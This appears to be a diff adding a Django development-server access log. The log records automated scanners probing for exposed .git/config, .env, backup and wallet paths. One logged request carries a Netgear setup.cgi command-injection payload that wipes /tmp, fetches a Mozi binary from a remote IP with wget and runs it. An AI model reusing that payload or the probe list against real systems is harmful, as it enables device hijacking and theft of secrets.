@@ -1,0 +1,279 @@
+Watching for file changes with StatReloader
+[15/Aug/2023 18:18:22] "GET / HTTP/1.1" 200 1515
+Not Found: /.git/config
+[15/Aug/2023 18:21:43] "GET /.git/config HTTP/1.1" 404 6529
+Not Found: /config
+[15/Aug/2023 18:21:44] "GET /config HTTP/1.1" 404 6514
+Not Found: /git/.git/config
+[15/Aug/2023 18:21:44] "GET /git/.git/config HTTP/1.1" 404 6541
+Not Found: /git/config
+[15/Aug/2023 18:21:48] "GET /git/config HTTP/1.1" 404 6526
+Not Found: /src/.git/config
+[15/Aug/2023 18:21:48] "GET /src/.git/config HTTP/1.1" 404 6541
+Not Found: /src/config
+[15/Aug/2023 18:21:48] "GET /src/config HTTP/1.1" 404 6526
+Not Found: /source/.git/config
+[15/Aug/2023 18:21:49] "GET /source/.git/config HTTP/1.1" 404 6550
+Not Found: /source/config
+[15/Aug/2023 18:21:49] "GET /source/config HTTP/1.1" 404 6535
+Not Found: /sources/.git/config
+[15/Aug/2023 18:21:49] "GET /sources/.git/config HTTP/1.1" 404 6553
+Not Found: /sources/config
+[15/Aug/2023 18:21:50] "GET /sources/config HTTP/1.1" 404 6538
+[15/Aug/2023 18:21:51] "GET /admin/.git/config HTTP/1.1" 302 0
+[15/Aug/2023 18:21:51] "GET /admin/login/?next=/admin/.git/config HTTP/1.1" 200 4298
+[15/Aug/2023 18:21:52] "GET /admin/config HTTP/1.1" 302 0
+[15/Aug/2023 18:21:52] "GET /admin/login/?next=/admin/config HTTP/1.1" 200 4288
+Not Found: /api/.git/config
+[15/Aug/2023 18:21:52] "GET /api/.git/config HTTP/1.1" 404 6541
+Not Found: /api/config
+[15/Aug/2023 18:21:52] "GET /api/config HTTP/1.1" 404 6526
+Not Found: /rest/.git/config
+[15/Aug/2023 18:21:56] "GET /rest/.git/config HTTP/1.1" 404 6544
+Not Found: /rest/config
+[15/Aug/2023 18:21:56] "GET /rest/config HTTP/1.1" 404 6529
+Not Found: /backend/.git/config
+[15/Aug/2023 18:21:56] "GET /backend/.git/config HTTP/1.1" 404 6553
+Not Found: /backend/config
+[15/Aug/2023 18:21:56] "GET /backend/config HTTP/1.1" 404 6538
+Not Found: /svc/.git/config
+[15/Aug/2023 18:21:57] "GET /svc/.git/config HTTP/1.1" 404 6541
+Not Found: /svc/config
+[15/Aug/2023 18:21:57] "GET /svc/config HTTP/1.1" 404 6526
+Not Found: /service/.git/config
+[15/Aug/2023 18:21:57] "GET /service/.git/config HTTP/1.1" 404 6553
+Not Found: /service/config
+[15/Aug/2023 18:21:58] "GET /service/config HTTP/1.1" 404 6538
+Not Found: /services/.git/config
+[15/Aug/2023 18:21:58] "GET /services/.git/config HTTP/1.1" 404 6556
+Not Found: /services/config
+[15/Aug/2023 18:21:58] "GET /services/config HTTP/1.1" 404 6541
+Not Found: /app/.git/config
+[15/Aug/2023 18:21:59] "GET /app/.git/config HTTP/1.1" 404 6541
+Not Found: /app/config
+[15/Aug/2023 18:22:00] "GET /app/config HTTP/1.1" 404 6526
+Not Found: /data/.git/config
+[15/Aug/2023 18:22:00] "GET /data/.git/config HTTP/1.1" 404 6544
+Not Found: /data/config
+[15/Aug/2023 18:22:01] "GET /data/config HTTP/1.1" 404 6529
+Not Found: /bak/.git/config
+[15/Aug/2023 18:22:02] "GET /bak/.git/config HTTP/1.1" 404 6541
+Not Found: /bak/config
+[15/Aug/2023 18:22:02] "GET /bak/config HTTP/1.1" 404 6526
+Not Found: /backup/.git/config
+[15/Aug/2023 18:22:02] "GET /backup/.git/config HTTP/1.1" 404 6550
+Not Found: /backup/config
+[15/Aug/2023 18:22:03] "GET /backup/config HTTP/1.1" 404 6535
+Not Found: /test/.git/config
+[15/Aug/2023 18:22:03] "GET /test/.git/config HTTP/1.1" 404 6544
+Not Found: /test/config
+[15/Aug/2023 18:22:03] "GET /test/config HTTP/1.1" 404 6529
+Not Found: /temp/.git/config
+[15/Aug/2023 18:22:04] "GET /temp/.git/config HTTP/1.1" 404 6544
+Not Found: /temp/config
+[15/Aug/2023 18:22:05] "GET /temp/config HTTP/1.1" 404 6529
+Not Found: /tmp/.git/config
+[15/Aug/2023 18:22:05] "GET /tmp/.git/config HTTP/1.1" 404 6541
+Not Found: /tmp/config
+[15/Aug/2023 18:22:05] "GET /tmp/config HTTP/1.1" 404 6526
+Not Found: /lib/.git/config
+[15/Aug/2023 18:22:06] "GET /lib/.git/config HTTP/1.1" 404 6541
+Not Found: /lib/config
+[15/Aug/2023 18:22:06] "GET /lib/config HTTP/1.1" 404 6526
+Not Found: /libs/.git/config
+[15/Aug/2023 18:22:06] "GET /libs/.git/config HTTP/1.1" 404 6544
+Not Found: /libs/config
+[15/Aug/2023 18:22:07] "GET /libs/config HTTP/1.1" 404 6529
+Not Found: /cfg/.git/config
+[15/Aug/2023 18:22:08] "GET /cfg/.git/config HTTP/1.1" 404 6541
+Not Found: /cfg/config
+[15/Aug/2023 18:22:08] "GET /cfg/config HTTP/1.1" 404 6526
+Not Found: /conf/.git/config
+[15/Aug/2023 18:22:09] "GET /conf/.git/config HTTP/1.1" 404 6544
+Not Found: /conf/config
+[15/Aug/2023 18:22:09] "GET /conf/config HTTP/1.1" 404 6529
+Not Found: /config/.git/config
+[15/Aug/2023 18:22:12] "GET /config/.git/config HTTP/1.1" 404 6550
+Not Found: /config/config
+[15/Aug/2023 18:22:12] "GET /config/config HTTP/1.1" 404 6535
+Not Found: /inc/.git/config
+[15/Aug/2023 18:22:13] "GET /inc/.git/config HTTP/1.1" 404 6541
+Not Found: /inc/config
+[15/Aug/2023 18:22:13] "GET /inc/config HTTP/1.1" 404 6526
+Not Found: /include/.git/config
+[15/Aug/2023 18:22:13] "GET /include/.git/config HTTP/1.1" 404 6553
+Not Found: /include/config
+[15/Aug/2023 18:22:14] "GET /include/config HTTP/1.1" 404 6538
+Not Found: /includes/.git/config
+[15/Aug/2023 18:22:14] "GET /includes/.git/config HTTP/1.1" 404 6556
+Not Found: /includes/config
+[15/Aug/2023 18:22:15] "GET /includes/config HTTP/1.1" 404 6541
+Not Found: /setup.cgi
+[15/Aug/2023 18:28:46] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://120.233.194.109:54953/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 6689
+[15/Aug/2023 18:29:55] "GET / HTTP/1.1" 200 1515
+[15/Aug/2023 18:29:55] "GET / HTTP/1.1" 200 1515
+Not Found: /git/
+[15/Aug/2023 18:29:55] "GET /git/ HTTP/1.1" 404 6508
+Not Found: /git
+[15/Aug/2023 18:29:56] "GET /git HTTP/1.1" 404 6505
+Not Found: /src/
+[15/Aug/2023 18:29:56] "GET /src/ HTTP/1.1" 404 6508
+Not Found: /src
+[15/Aug/2023 18:29:56] "GET /src HTTP/1.1" 404 6505
+Not Found: /source/
+[15/Aug/2023 18:29:56] "GET /source/ HTTP/1.1" 404 6517
+Not Found: /source
+[15/Aug/2023 18:29:57] "GET /source HTTP/1.1" 404 6514
+Not Found: /sources/
+[15/Aug/2023 18:29:57] "GET /sources/ HTTP/1.1" 404 6520
+Not Found: /sources
+[15/Aug/2023 18:29:58] "GET /sources HTTP/1.1" 404 6517
+[15/Aug/2023 18:29:58] "GET /admin/ HTTP/1.1" 302 0
+[15/Aug/2023 18:29:58] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 4276
+[15/Aug/2023 18:29:58] "GET /admin HTTP/1.1" 301 0
+[15/Aug/2023 18:29:59] "GET /admin/ HTTP/1.1" 302 0
+[15/Aug/2023 18:29:59] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 4276
+Not Found: /api/
+[15/Aug/2023 18:29:59] "GET /api/ HTTP/1.1" 404 6508
+Not Found: /api
+[15/Aug/2023 18:29:59] "GET /api HTTP/1.1" 404 6505
+Not Found: /rest/
+[15/Aug/2023 18:30:00] "GET /rest/ HTTP/1.1" 404 6511
+Not Found: /rest
+[15/Aug/2023 18:30:00] "GET /rest HTTP/1.1" 404 6508
+Not Found: /backend/
+[15/Aug/2023 18:30:00] "GET /backend/ HTTP/1.1" 404 6520
+Not Found: /backend
+[15/Aug/2023 18:30:00] "GET /backend HTTP/1.1" 404 6517
+Not Found: /svc/
+[15/Aug/2023 18:30:01] "GET /svc/ HTTP/1.1" 404 6508
+Not Found: /svc
+[15/Aug/2023 18:30:01] "GET /svc HTTP/1.1" 404 6505
+Not Found: /service/
+[15/Aug/2023 18:30:01] "GET /service/ HTTP/1.1" 404 6520
+Not Found: /service
+[15/Aug/2023 18:30:02] "GET /service HTTP/1.1" 404 6517
+Not Found: /services/
+[15/Aug/2023 18:30:02] "GET /services/ HTTP/1.1" 404 6523
+Not Found: /services
+[15/Aug/2023 18:30:02] "GET /services HTTP/1.1" 404 6520
+Not Found: /app/
+[15/Aug/2023 18:30:02] "GET /app/ HTTP/1.1" 404 6508
+Not Found: /app
+[15/Aug/2023 18:30:03] "GET /app HTTP/1.1" 404 6505
+Not Found: /data/
+[15/Aug/2023 18:30:03] "GET /data/ HTTP/1.1" 404 6511
+Not Found: /data
+[15/Aug/2023 18:30:03] "GET /data HTTP/1.1" 404 6508
+Not Found: /bak/
+[15/Aug/2023 18:30:04] "GET /bak/ HTTP/1.1" 404 6508
+Not Found: /bak
+[15/Aug/2023 18:30:04] "GET /bak HTTP/1.1" 404 6505
+Not Found: /backup/
+[15/Aug/2023 18:30:04] "GET /backup/ HTTP/1.1" 404 6517
+Not Found: /backup
+[15/Aug/2023 18:30:04] "GET /backup HTTP/1.1" 404 6514
+Not Found: /test/
+[15/Aug/2023 18:30:05] "GET /test/ HTTP/1.1" 404 6511
+Not Found: /test
+[15/Aug/2023 18:30:05] "GET /test HTTP/1.1" 404 6508
+Not Found: /temp/
+[15/Aug/2023 18:30:05] "GET /temp/ HTTP/1.1" 404 6511
+Not Found: /temp
+[15/Aug/2023 18:30:06] "GET /temp HTTP/1.1" 404 6508
+Not Found: /tmp/
+[15/Aug/2023 18:30:06] "GET /tmp/ HTTP/1.1" 404 6508
+Not Found: /tmp
+[15/Aug/2023 18:30:06] "GET /tmp HTTP/1.1" 404 6505
+Not Found: /lib/
+[15/Aug/2023 18:30:06] "GET /lib/ HTTP/1.1" 404 6508
+Not Found: /lib
+[15/Aug/2023 18:30:07] "GET /lib HTTP/1.1" 404 6505
+Not Found: /libs/
+[15/Aug/2023 18:30:07] "GET /libs/ HTTP/1.1" 404 6511
+Not Found: /libs
+[15/Aug/2023 18:30:07] "GET /libs HTTP/1.1" 404 6508
+Not Found: /cfg/
+[15/Aug/2023 18:30:08] "GET /cfg/ HTTP/1.1" 404 6508
+Not Found: /cfg
+[15/Aug/2023 18:30:08] "GET /cfg HTTP/1.1" 404 6505
+Not Found: /conf/
+[15/Aug/2023 18:30:08] "GET /conf/ HTTP/1.1" 404 6511
+Not Found: /conf
+[15/Aug/2023 18:30:09] "GET /conf HTTP/1.1" 404 6508
+Not Found: /config/
+[15/Aug/2023 18:30:09] "GET /config/ HTTP/1.1" 404 6517
+Not Found: /config
+[15/Aug/2023 18:30:09] "GET /config HTTP/1.1" 404 6514
+Not Found: /inc/
+[15/Aug/2023 18:30:09] "GET /inc/ HTTP/1.1" 404 6508
+Not Found: /inc
+[15/Aug/2023 18:30:10] "GET /inc HTTP/1.1" 404 6505
+Not Found: /include/
+[15/Aug/2023 18:30:10] "GET /include/ HTTP/1.1" 404 6520
+Not Found: /include
+[15/Aug/2023 18:30:10] "GET /include HTTP/1.1" 404 6517
+Not Found: /includes/
+[15/Aug/2023 18:30:11] "GET /includes/ HTTP/1.1" 404 6523
+Not Found: /includes
+[15/Aug/2023 18:30:11] "GET /includes HTTP/1.1" 404 6520
+Not Found: /upload/
+[15/Aug/2023 18:30:11] "GET /upload/ HTTP/1.1" 404 6517
+Not Found: /upload
+[15/Aug/2023 18:30:11] "GET /upload HTTP/1.1" 404 6514
+Not Found: /uploads/
+[15/Aug/2023 18:30:12] "GET /uploads/ HTTP/1.1" 404 6520
+Not Found: /uploads
+[15/Aug/2023 18:30:12] "GET /uploads HTTP/1.1" 404 6517
+Not Found: /download/
+[15/Aug/2023 18:30:12] "GET /download/ HTTP/1.1" 404 6523
+Not Found: /download
+[15/Aug/2023 18:30:13] "GET /download HTTP/1.1" 404 6520
+Not Found: /downloads/
+[15/Aug/2023 18:30:13] "GET /downloads/ HTTP/1.1" 404 6526
+Not Found: /downloads
+[15/Aug/2023 18:30:13] "GET /downloads HTTP/1.1" 404 6523
+Not Found: /files/
+[15/Aug/2023 18:30:13] "GET /files/ HTTP/1.1" 404 6514
+Not Found: /files
+[15/Aug/2023 18:30:14] "GET /files HTTP/1.1" 404 6511
+Not Found: /log/
+[15/Aug/2023 18:30:14] "GET /log/ HTTP/1.1" 404 6508
+Not Found: /log
+[15/Aug/2023 18:30:14] "GET /log HTTP/1.1" 404 6505
+Not Found: /logs/
+[15/Aug/2023 18:30:15] "GET /logs/ HTTP/1.1" 404 6511
+Not Found: /logs
+[15/Aug/2023 18:30:15] "GET /logs HTTP/1.1" 404 6508
+Not Found: /cron/
+[15/Aug/2023 18:30:15] "GET /cron/ HTTP/1.1" 404 6511
+Not Found: /cron
+[15/Aug/2023 18:30:16] "GET /cron HTTP/1.1" 404 6508
+Not Found: /wallet/
+[15/Aug/2023 18:30:16] "GET /wallet/ HTTP/1.1" 404 6517
+Not Found: /wallet
+[15/Aug/2023 18:30:16] "GET /wallet HTTP/1.1" 404 6514
+Not Found: /wallets/
+[15/Aug/2023 18:30:16] "GET /wallets/ HTTP/1.1" 404 6520
+Not Found: /wallets
+[15/Aug/2023 18:30:17] "GET /wallets HTTP/1.1" 404 6517
+[15/Aug/2023 18:30:34] "GET / HTTP/1.1" 200 1515
+[15/Aug/2023 18:30:42] "GET / HTTP/1.1" 200 1515
+Not Found: /.env
+[15/Aug/2023 18:45:05] "GET /.env HTTP/1.1" 404 6508
+Not Found: /wp-content/
+[15/Aug/2023 18:45:07] "GET /wp-content/ HTTP/1.1" 404 6529
+[15/Aug/2023 18:51:56] "GET / HTTP/1.1" 200 1515
+[15/Aug/2023 18:58:23] "GET / HTTP/1.1" 200 1515
+[15/Aug/2023 19:14:11] "GET / HTTP/1.1" 200 1515
+Not Found: /wp-login.php
+[15/Aug/2023 19:27:48] "GET /wp-login.php HTTP/1.1" 404 6525
+Not Found: /robots.txt
+[15/Aug/2023 19:27:53] "GET /robots.txt HTTP/1.1" 404 6519
+[15/Aug/2023 19:39:11] "HEAD / HTTP/1.1" 200 0
+[15/Aug/2023 19:39:12] "GET / HTTP/1.1" 200 1515
+[15/Aug/2023 19:39:12] "GET /staticfiles/css/main.css HTTP/1.1" 200 11099
+[15/Aug/2023 19:39:12] "GET /staticfiles/css/botones.css HTTP/1.1" 200 842
+[15/Aug/2023 19:39:12] "GET /staticfiles/images/logo_NTTCS_CF.jpg HTTP/1.1" 200 20664
+[15/Aug/2023 19:39:12] "GET /staticfiles/css/estilos.css HTTP/1.1" 200 8262
+[15/Aug/2023 19:52:46] "GET / HTTP/1.1" 200 1515
